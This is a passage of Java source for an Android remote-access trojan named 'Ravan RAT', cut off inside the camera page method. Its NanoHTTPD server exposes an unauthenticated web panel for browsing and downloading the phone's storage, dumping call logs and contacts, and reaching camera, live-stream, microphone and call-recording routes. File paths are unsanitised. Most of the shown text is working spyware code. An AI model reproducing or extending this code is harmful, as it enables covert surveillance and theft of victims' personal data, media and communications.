package com.security.ravan;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.Manifest;

import java.io.File;
import java.io.FileInputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD;

public class RavanHttpServer extends NanoHTTPD {

    private final Context context;

    private static final String HTML_HEADER = "<!DOCTYPE html>" +
            "<html lang=\"en\">" +
            "<head>" +
            "<meta charset=\"UTF-8\">" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
            "<title>Ravan RAT</title>" +
            "<style>" +
            "* { margin: 0; padding: 0; box-sizing: border-box; }" +
            "body {" +
            "font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;" +
            "background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);" +
            "min-height: 100vh;" +
            "color: #e8e8e8;" +
            "}" +
            ".container { max-width: 1200px; margin: 0 auto; padding: 20px; }" +
            ".header { text-align: center; padding: 30px 0; border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 30px; }"
            +
            ".header h1 { font-size: 2.5rem; background: linear-gradient(90deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }"
            +
            ".header p { color: #888; }" +
            ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 30px; }" +
            ".nav a { padding: 12px 20px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.1); font-size: 0.9rem; }"
            +
            ".nav a:hover { background: rgba(233, 69, 96, 0.3); border-color: #e94560; transform: translateY(-2px); }" +
            ".card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 25px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }"
            +
            ".file-list { list-style: none; }" +
            ".file-item { display: flex; align-items: center; padding: 15px; margin: 8px 0; background: rgba(255,255,255,0.03); border-radius: 10px; transition: all 0.3s ease; border: 1px solid transparent; }"
            +
            ".file-item:hover { background: rgba(255,255,255,0.08); border-color: rgba(233, 69, 96, 0.3); }" +
            ".file-icon { width: 45px; height: 45px; border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 1.3rem; }"
            +
            ".folder-icon { background: linear-gradient(135deg, #f39c12, #f1c40f); }" +
            ".file-icon-default { background: linear-gradient(135deg, #3498db, #2980b9); }" +
            ".file-icon-image { background: linear-gradient(135deg, #9b59b6, #8e44ad); }" +
            ".file-icon-video { background: linear-gradient(135deg, #e74c3c, #c0392b); }" +
            ".file-icon-audio { background: linear-gradient(135deg, #1abc9c, #16a085); }" +
            ".file-icon-doc { background: linear-gradient(135deg, #2ecc71, #27ae60); }" +
            ".file-info { flex: 1; }" +
            ".file-name { color: #fff; text-decoration: none; font-weight: 500; display: block; margin-bottom: 4px; }" +
            ".file-name:hover { color: #e94560; }" +
            ".file-meta { font-size: 0.85rem; color: #888; }" +
            ".breadcrumb { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 10px; }"
            +
            ".breadcrumb a { color: #e94560; text-decoration: none; }" +
            ".breadcrumb span { color: #666; }" +
            "table { width: 100%; border-collapse: collapse; margin-top: 15px; }" +
            "th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }" +
            "th { background: rgba(233, 69, 96, 0.2); color: #e94560; font-weight: 600; font-size: 0.85rem; }" +
            "td { font-size: 0.9rem; }" +
            "tr:hover { background: rgba(255,255,255,0.03); }" +
            ".call-incoming { color: #2ecc71; }" +
            ".call-outgoing { color: #3498db; }" +
            ".call-missed { color: #e74c3c; }" +
            ".contact-avatar { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #e94560, #ff6b6b); display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 12px; }"
            +
            ".empty-state { text-align: center; padding: 60px 20px; color: #888; }" +
            ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; }" +
            ".info-section { background: rgba(0,0,0,0.2); border-radius: 12px; padding: 20px; margin-bottom: 15px; }" +
            ".info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }" +
            ".info-item { display: flex; justify-content: space-between; padding: 10px 15px; background: rgba(255,255,255,0.03); border-radius: 8px; }"
            +
            ".info-label { color: #888; font-size: 0.85rem; }" +
            ".info-value { color: #fff; font-weight: 500; font-size: 0.85rem; }" +
            ".pagination { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }" +
            ".pagination a { padding: 8px 16px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; }"
            +
            ".pagination a:hover { background: rgba(233, 69, 96, 0.3); }" +
            ".pagination .active { background: #e94560; }" +
            "@media (max-width: 768px) { " +
            ".header h1 { font-size: 1.8rem; } " +
            ".nav a { padding: 10px 14px; font-size: 0.8rem; } " +
            "th, td { padding: 8px 6px; font-size: 0.75rem; } " +
            ".info-grid { grid-template-columns: 1fr; } " +
            "}" +
            "</style>" +
            "</head>" +
            "<body>" +
            "<div class=\"container\">" +
            "<div class=\"header\">" +
            "<h1>Ravan RAT</h1>" +
            "</div>" +
            "<div class=\"nav\">" +
            "<a href=\"/\">Home</a>" +
            "<a href=\"/device\">Device Info</a>" +
            "<a href=\"/camera\">Camera</a>" +
            "<a href=\"/audio\">Audio</a>" +
            "<a href=\"/files\">Files</a>" +
            "<a href=\"/calls\">Call Logs</a>" +
            "<a href=\"/contacts\">Contacts</a>" +
            "</div>";

    private static final String HTML_FOOTER = "</div>" +
            "</body>" +
            "</html>";

    public RavanHttpServer(Context context, int port) {
        super(port);
        this.context = context;
    }

    @Override
    public Response serve(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        try {
            if (uri.equals("/") || uri.isEmpty()) {
                return serveHome();
            } else if (uri.equals("/device")) {
                return serveDeviceInfo();
            } else if (uri.equals("/files") || uri.startsWith("/files/")) {
                return serveFiles(uri, params);
            } else if (uri.equals("/calls")) {
                return serveCallLogs(params);
            } else if (uri.equals("/contacts")) {
                return serveContacts(params);
            } else if (uri.equals("/camera")) {
                return serveCameraPage();
            } else if (uri.equals("/camera/capture")) {
                return serveCameraCapture(params);
            } else if (uri.equals("/camera/photo")) {
                return serveCameraPhoto(params);
            } else if (uri.equals("/camera/live")) {
                return serveLiveStreamPage(params);
            } else if (uri.equals("/camera/stream")) {
                return serveMJPEGStream(params);
            } else if (uri.equals("/camera/frame")) {
                return serveSingleFrame();
            } else if (uri.equals("/camera/start-stream")) {
                return startCameraStream(params);
            } else if (uri.equals("/camera/stop-stream")) {
                return stopCameraStream();
            } else if (uri.equals("/camera/record")) {
                return startVideoRecording(params);
            } else if (uri.equals("/camera/stop-record")) {
                return stopVideoRecording();
            } else if (uri.equals("/camera/status")) {
                return serveCameraStatus();
            } else if (uri.startsWith("/download/")) {
                return serveDownload(uri);
            } else if (uri.equals("/audio")) {
                return serveAudioPage();
            } else if (uri.equals("/audio/mic/start")) {
                return startMicRecording(params);
            } else if (uri.equals("/audio/mic/stop")) {
                return stopMicRecording();
            } else if (uri.equals("/audio/call/start")) {
                return startCallRecording(params);
            } else if (uri.equals("/audio/call/stop")) {
                return stopCallRecording();
            } else if (uri.equals("/audio/status")) {
                return serveAudioStatus();
            } else if (uri.equals("/audio/settings")) {
                return updateAudioSettings(params);
            } else if (uri.equals("/audio/recordings")) {
                return serveAudioRecordings();
            } else {
                return serve404();
            }
        } catch (Exception e) {
            return serveError(e.getMessage());
        }
    }

    private Response serveHome() {
        String ipv6 = MainActivity.getLocalIPv6Address();
        String ipDisplay = (ipv6 != null ? ipv6 : "Not Available");

        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">Device Status</h2>" +
                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">"
                +
                "<div style=\"padding: 20px; background: rgba(46, 204, 113, 0.1); border-radius: 10px; border-left: 4px solid #2ecc71;\">"
                +
                "<div style=\"font-size: 0.9rem; color: #888;\">Server Status</div>" +
                "<div style=\"font-size: 1.3rem; font-weight: bold; color: #2ecc71;\">Online</div>" +
                "</div>" +
                "<div style=\"padding: 20px; background: rgba(52, 152, 219, 0.1); border-radius: 10px; border-left: 4px solid #3498db;\">"
                +
                "<div style=\"font-size: 0.9rem; color: #888;\">Port</div>" +
                "<div style=\"font-size: 1.3rem; font-weight: bold; color: #3498db;\">8080</div>" +
                "</div>" +
                "<div style=\"padding: 20px; background: rgba(233, 69, 96, 0.1); border-radius: 10px; border-left: 4px solid #e94560;\">"
                +
                "<div style=\"font-size: 0.9rem; color: #888;\">IPv6 Address</div>" +
                "<div style=\"font-size: 0.9rem; font-weight: bold; color: #e94560; word-break: break-all;\">"
                + ipDisplay + "</div>" +
                "</div>" +
                "</div>" +
                "</div>" +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">Quick Access</h2>" +
                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px;\">"
                +
                "<a href=\"/device\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(155, 89, 182, 0.2), rgba(142, 68, 173, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(155, 89, 182, 0.3);\">"
                +
                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128241;</div>" +
                "<div style=\"color: #9b59b6; font-weight: 600; font-size: 0.9rem;\">Device Info</div>" +
                "</a>" +
                "<a href=\"/files\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(52, 152, 219, 0.2), rgba(41, 128, 185, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(52, 152, 219, 0.3);\">"
                +
                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128193;</div>" +
                "<div style=\"color: #3498db; font-weight: 600; font-size: 0.9rem;\">File Manager</div>" +
                "</a>" +
                "<a href=\"/calls\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.2), rgba(39, 174, 96, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(46, 204, 113, 0.3);\">"
                +
                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128222;</div>" +
                "<div style=\"color: #2ecc71; font-weight: 600; font-size: 0.9rem;\">Call Logs</div>" +
                "</a>" +
                "<a href=\"/contacts\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(230, 126, 34, 0.2), rgba(211, 84, 0, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(230, 126, 34, 0.3);\">"
                +
                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128101;</div>" +
                "<div style=\"color: #e67e22; font-weight: 600; font-size: 0.9rem;\">Contacts</div>" +
                "</a>" +
                "<a href=\"/camera\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(231, 76, 60, 0.2), rgba(192, 57, 43, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(231, 76, 60, 0.3);\">"
                +
                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128247;</div>" +
                "<div style=\"color: #e74c3c; font-weight: 600; font-size: 0.9rem;\">Camera</div>" +
                "</a>" +
                "<a href=\"/audio\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(26, 188, 156, 0.2), rgba(22, 160, 133, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(26, 188, 156, 0.3);\">"
                +
                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#127908;</div>" +
                "<div style=\"color: #1abc9c; font-weight: 600; font-size: 0.9rem;\">Audio</div>" +
                "</a>" +
                "</div>" +
                "</div>" +
                HTML_FOOTER;

        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveDeviceInfo() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">Device Information</h2>" +
                DeviceInfo.getDeviceInfoHtml(context) +
                "</div>" +
                HTML_FOOTER;

        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveFiles(String uri, Map<String, String> params) {
        String path = uri.equals("/files") ? "" : uri.substring(7);
        path = path.replace("%20", " ");

        File baseDir = Environment.getExternalStorageDirectory();
        File currentDir = new File(baseDir, path);

        if (!currentDir.exists()) {
            return serve404();
        }

        if (currentDir.isFile()) {
            return serveFileDownload(currentDir);
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);

        // Breadcrumb
        html.append("<div class=\"breadcrumb\">");
        html.append("<a href=\"/files\">Storage</a>");

        if (!path.isEmpty()) {
            String[] parts = path.split("/");
            StringBuilder pathBuilder = new StringBuilder();
            for (String part : parts) {
                if (!part.isEmpty()) {
                    pathBuilder.append("/").append(part);
                    html.append("<span>/</span>");
                    html.append("<a href=\"/files").append(pathBuilder).append("\">").append(part).append("</a>");
                }
            }
        }
        html.append("</div>");

        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">").append(path.isEmpty() ? "Storage" : currentDir.getName())
                .append("</h2>");

        File[] files = currentDir.listFiles();
        if (files != null && files.length > 0) {
            html.append("<ul class=\"file-list\">");

            // Sort: folders first, then files
            java.util.Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory())
                    return -1;
                if (!a.isDirectory() && b.isDirectory())
                    return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });

            for (File file : files) {
                String fileName = file.getName();
                String filePath = path.isEmpty() ? fileName : path + "/" + fileName;
                String icon = getFileIcon(file);
                String iconClass = getFileIconClass(file);

                html.append("<li class=\"file-item\">");
                html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
                html.append("<div class=\"file-info\">");
                html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName)
                        .append("</a>");
                html.append("<div class=\"file-meta\">");

                if (file.isDirectory()) {
                    File[] subFiles = file.listFiles();
                    int count = subFiles != null ? subFiles.length : 0;
                    html.append("Folder - ").append(count).append(" items");
                } else {
                    html.append(formatFileSize(file.length())).append(" - ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                }

                html.append("</div></div>");

                if (file.isFile()) {
                    html.append("<a href=\"/download/").append(filePath)
                            .append("\" style=\"padding: 8px 16px; background: rgba(233, 69, 96, 0.2); border-radius: 8px; color: #e94560; text-decoration: none; font-size: 0.85rem;\">Download</a>");
                }

                html.append("</li>");
            }
            html.append("</ul>");
        } else {
            html.append(
                    "<div class=\"empty-state\"><div class=\"icon\">&#128237;</div><p>This folder is empty</p></div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveFileDownload(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            String mimeType = getMimeType(file.getName());
            Response response = newFixedLengthResponse(Response.Status.OK, mimeType, fis, file.length());
            response.addHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            return response;
        } catch (Exception e) {
            return serveError("Cannot read file: " + e.getMessage());
        }
    }

    private Response serveDownload(String uri) {
        String path = uri.substring(10);
        path = path.replace("%20", " ");
        File baseDir = Environment.getExternalStorageDirectory();
        File file = new File(baseDir, path);

        if (!file.exists() || !file.isFile()) {
            return serve404();
        }

        return serveFileDownload(file);
    }

    private Response serveCallLogs(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Recent Call Logs</h2>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Call log permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            // Query for call logs - compatible with Android 13+
            String[] projection = new String[] {
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };

            String sortOrder = CallLog.Calls.DATE + " DESC";

            cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder);

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" calls | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    // Skip to offset
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    // Limit results
                    if (count >= limit)
                        break;

                    int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
                    int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                    int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

                    String number = numberIdx >= 0 ? cursor.getString(numberIdx) : "Unknown";
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
                    int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                    long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                    int duration = durationIdx >= 0 ? cursor.getInt(durationIdx) : 0;

                    String typeIcon, typeClass;
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            typeIcon = "&#8595; In";
                            typeClass = "call-incoming";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            typeIcon = "&#8593; Out";
                            typeClass = "call-outgoing";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            typeIcon = "&#10006; Missed";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            typeIcon = "&#10006; Rejected";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            typeIcon = "&#128683; Blocked";
                            typeClass = "call-missed";
                            break;
                        default:
                            typeIcon = "&#128222; Other";
                            typeClass = "";
                    }

                    html.append("<tr>");
                    html.append("<td class=\"").append(typeClass).append("\">").append(typeIcon).append("</td>");
                    html.append("<td>").append(name != null && !name.isEmpty() ? escapeHtml(name) : "-")
                            .append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "Unknown").append("</td>");
                    html.append("<td>").append(
                            new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(date)))
                            .append("</td>");
                    html.append("<td>").append(formatDuration(duration)).append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\">");
                    if (page > 1) {
                        html.append("<a href=\"/calls?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        if (i == page) {
                            html.append("<a class=\"active\" href=\"/calls?page=").append(i).append("\">").append(i)
                                    .append("</a>");
                        } else {
                            html.append("<a href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
                        }
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/calls?page=").append(page + 1).append("\">Next &#8594;</a>");
                    }
                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128222;</div><p>No call logs found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading call logs</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveContacts(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Contacts</h2>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Contacts permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" contacts | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Name</th><th>Phone Number</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    if (count >= limit)
                        break;

                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    String initial = name != null && !name.isEmpty() ? name.substring(0, 1).toUpperCase() : "?";

                    html.append("<tr>");
                    html.append("<td style=\"display: flex; align-items: center;\">");
                    html.append("<div class=\"contact-avatar\">").append(initial).append("</div>");
                    html.append("<span>").append(name != null ? escapeHtml(name) : "Unknown").append("</span>");
                    html.append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "N/A").append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\">");
                    if (page > 1) {
                        html.append("<a href=\"/contacts?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        if (i == page) {
                            html.append("<a class=\"active\" href=\"/contacts?page=").append(i).append("\">").append(i)
                                    .append("</a>");
                        } else {
                            html.append("<a href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
                        }
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/contacts?page=").append(page + 1).append("\">Next &#8594;</a>");
                    }
                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128101;</div><p>No contacts found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading contacts</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serve404() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#128269;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Page Not Found</h2>" +
                "<p>The requested page does not exist.</p>" +
                "<a href=\"/\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: linear-gradient(135deg, #e94560, #ff6b6b); border-radius: 10px; color: white; text-decoration: none;\">Go Home</a>"
                +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/html", html);
    }

    private Response serveError(String message) {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#9888;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
                "<p>" + escapeHtml(message) + "</p>" +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
    }

    private String escapeHtml(String text) {
        if (text == null)
            return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }

    private String getFileIcon(File file) {
        if (file.isDirectory())
            return "&#128193;";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "&#128444;";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "&#127916;";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "&#127925;";
        if (name.matches(".*\\.(pdf)$"))
            return "&#128196;";
        if (name.matches(".*\\.(doc|docx|txt|rtf)$"))
            return "&#128221;";
        if (name.matches(".*\\.(xls|xlsx|csv)$"))
            return "&#128202;";
        if (name.matches(".*\\.(zip|rar|7z|tar|gz)$"))
            return "&#128230;";
        if (name.matches(".*\\.(apk)$"))
            return "&#128241;";
        return "&#128196;";
    }

    private String getFileIconClass(File file) {
        if (file.isDirectory())
            return "folder-icon";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "file-icon-image";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "file-icon-video";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "file-icon-audio";
        if (name.matches(".*\\.(pdf|doc|docx|txt|rtf|xls|xlsx|csv)$"))
            return "file-icon-doc";
        return "file-icon-default";
    }

    private String getMimeType(String filename) {
        String name = filename.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg"))
            return "image/jpeg";
        if (name.endsWith(".png"))
            return "image/png";
        if (name.endsWith(".gif"))
            return "image/gif";
        if (name.endsWith(".mp4"))
            return "video/mp4";
        if (name.endsWith(".mp3"))
            return "audio/mpeg";
        if (name.endsWith(".pdf"))
            return "application/pdf";
        if (name.endsWith(".zip"))
            return "application/zip";
        if (name.endsWith(".apk"))
            return "application/vnd.android.package-archive";
        return "application/octet-stream";
    }

    private String formatFileSize(long size) {
        if (size < 1024)
            return size + " B";
        if (size < 1024 * 1024)
            return String.format("%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024)
            return String.format("%.1f MB", size / (1024.0 * 1024));
        return String.format("%.1f GB", size / (1024.0 * 1024 * 1024));
    }

    private String formatDuration(int seconds) {
        if (seconds < 60)
            return seconds + "s";
        if (seconds < 3600)
            return String.format("%dm %ds", seconds / 60, seconds % 60);
        return String.format("%dh %dm", seconds / 3600, (seconds % 3600) / 60);
    }

    // ============ Camera Methods ============

    private Response serveCameraPage() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Camera</h2>");

        // Check permission
